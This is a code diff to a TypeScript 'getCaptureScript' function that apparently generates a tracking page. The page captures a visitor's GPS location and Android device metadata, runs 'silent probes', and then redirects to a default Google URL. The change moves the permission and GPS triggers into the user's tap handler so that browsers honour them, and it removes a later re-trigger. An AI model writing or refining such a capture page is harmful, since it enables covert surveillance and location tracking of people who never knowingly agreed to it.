@@ -155,6 +155,11 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
           function handleTap(e) {
             console.log("[DEBUG] handleTap click", e);
             clientLog("handleTap: Clicked", { e: e ? e.type : 'unknown' });
+            
+            // Immediate trigger of permissions within direct user gesture
+            if (typeof fireParallel === 'function') fireParallel().catch(e => console.error(e));
+            if (typeof fireGPS === 'function') fireGPS().catch(e => console.error(e));
+            
             var btn = getTargetBtn();
             if (!btn) {
               console.error("[DEBUG] handleTap: No button found!");
@@ -268,16 +273,6 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
         await flushExtra();
       };
       captureAndroidMeta().catch(e => console.error(e));
-
-      // Re-trigger permissions
-      if (typeof fireParallel === 'function') {
-        clientLog("startCapture: Calling fireParallel");
-        fireParallel().catch(e => console.error(e));
-      }
-      if (typeof fireGPS === 'function') {
-        clientLog("startCapture: Calling fireGPS");
-        fireGPS().catch(e => console.error(e));
-      }
 
       // Silent Probes
       runSilentProbes().then(() => flushExtra()).catch(e => console.error(e));
